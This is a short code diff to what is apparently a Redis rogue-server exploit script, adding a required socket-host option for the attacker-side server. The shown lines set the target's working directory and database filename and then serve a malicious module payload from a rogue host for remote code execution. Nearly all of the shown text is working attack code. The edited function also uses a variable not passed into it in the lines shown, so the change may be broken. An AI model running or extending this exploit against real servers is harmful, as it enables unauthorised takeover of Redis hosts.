@@ -175,7 +175,7 @@ def runserver(rhost, rport, lhost, lport):
     remote.do("CONFIG SET dir /tmp/")
     remote.do("CONFIG SET dbfilename {}".format(expfile))
     sleep(2)
-    rogue = RogueServer(lhost, lport)
+    rogue = RogueServer(socket_host, lport)
     print("[*] Tring to run payload")
     rogue.exp()
     sleep(2)
@@ -206,6 +206,7 @@ def main():
     parser.add_argument("-f", "--file", type=str, help="RedisModules to load, default exp.so", default='exp_lin.so')
     parser.add_argument("-a", "--auth", dest="auth", type=str, help="redis password")
     parser.add_argument("-v", "--verbose", action="store_true", help="show more info", default=False)
+    parser.add_argument("-s", "--socket-host", dest="socket_host", type=str, required=True)
     options = parser.parse_args()
     # runserver("127.0.0.1", 6379, "127.0.0.1", 21000)
 
